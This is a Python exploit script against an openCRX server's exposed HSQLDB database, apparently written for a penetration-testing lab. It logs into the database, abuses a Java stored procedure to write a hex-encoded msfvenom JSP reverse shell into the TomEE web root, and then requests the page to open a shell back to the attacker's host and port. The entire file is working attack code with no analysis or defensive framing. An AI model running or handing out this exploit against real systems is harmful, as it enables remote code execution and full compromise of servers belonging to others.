import jaydebeapi
from binascii import hexlify
import argparse
import requests
parser = argparse.ArgumentParser()
parser.add_argument('-ip', '--lhost', help='Attacker IP', required=True)
parser.add_argument('-p', '--lport', help='Attacker Port', required=True)
parser.add_argument('-t', '--target', help='Target IP or hostname', required=True)
parser.add_argument('-u', '--user', help='DB username', required=True)
parser.add_argument('-dbp', '--password', help='DB password', required=True)
args = parser.parse_args()
#genereated with msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.xxx LPORT=443 -f raw then convereted to use variables for LHOST and LPORT
rvsh = "<%@page import=\"java.lang.*\"%>"
rvsh += "<%@page import=\"java.util.*\"%>"
rvsh += "<%@page import=\"java.io.*\"%>"
rvsh += "<%@page import=\"java.net.*\"%>"
rvsh += "<%"
rvsh += "  class StreamConnector extends Thread"
rvsh += "  {"
rvsh += "    InputStream es;"
rvsh += "    OutputStream yx; "
rvsh += "    StreamConnector( InputStream es, OutputStream yx )"
rvsh += "    {"
rvsh += "      this.es = es;"
rvsh += "      this.yx = yx;"
rvsh += "    }"
rvsh += "    public void run()"
rvsh += "    {"
rvsh += "      BufferedReader nz  = null;"
rvsh += "      BufferedWriter mvp = null;"
rvsh += "      try"
rvsh += "      {"
rvsh += "        nz  = new BufferedReader( new InputStreamReader( this.es ) );"
rvsh += "        mvp = new BufferedWriter( new OutputStreamWriter( this.yx ) );"
rvsh += "        char buffer[] = new char[8192];"
rvsh += "        int length;"
rvsh += "        while( ( length = nz.read( buffer, 0, buffer.length ) ) > 0 )"
rvsh += "        {"
rvsh += "          mvp.write( buffer, 0, length );"
rvsh += "          mvp.flush();"
rvsh += "        }"
rvsh += "      } catch( Exception e ){}"
rvsh += "      try"
rvsh += "      {"
rvsh += "        if( nz != null )"
rvsh += "          nz.close();"
rvsh += "        if( mvp != null )"
rvsh += "          mvp.close();"
rvsh += "      } catch( Exception e ){}"
rvsh += "    }"
rvsh += "  }"
rvsh += "  try"
rvsh += "  {"
rvsh += "    String ShellPath;"
rvsh += "  ShellPath = new String(\"/bin/sh\");"
rvsh += "    Socket socket = new Socket( \""+args.lhost+"\", "+args.lport+" );"
rvsh += "    Process process = Runtime.getRuntime().exec( ShellPath );"
rvsh += "    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();"
rvsh += "    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();"
rvsh += "  } catch( Exception e ) {}"
rvsh += "%>"
print("[+]Converting Rerverse JSP Shell to ASCII hex.....")
str = rvsh.encode()
rvsha = hexlify(str).decode()
print("[+]Reverse JSP Shell:  "+rvsha)
print("[+]Connectiing to target HSQLDB on port 9001 with username:"+args.user+" and password:"+args.password+" .....")
conn = jaydebeapi.connect("org.hsqldb.jdbcDriver", "jdbc:hsqldb:hsql://"+args.target+":9001/CRX", [args.user,args.password], "/usr/share/java/hsqldb.jar",)
curs = conn.cursor()
print("[+]Creating Procedure writeBytesToFilename....")
curs.execute('CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1600)) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME \'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename\'')
print("[+]Calling procedure writeBytesToFilename to create JSP reverse shell")
curs.execute('call writeBytesToFilename(\'../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/rvsh.jsp\', cast(\''+rvsha+'\' AS VARBINARY(1600)))')
curs.close()
conn.close()
http_proxy = 'http://127.0.0.1:8080'
proxyDict = {
            "http" : http_proxy,
            "https" : http_proxy
}
print("[+]Launching reverse shell. Check your netcat listener....")
r = requests.get("http://"+args.target+":8080/opencrx-core-CRX/rvsh.jsp", proxies=proxyDict)
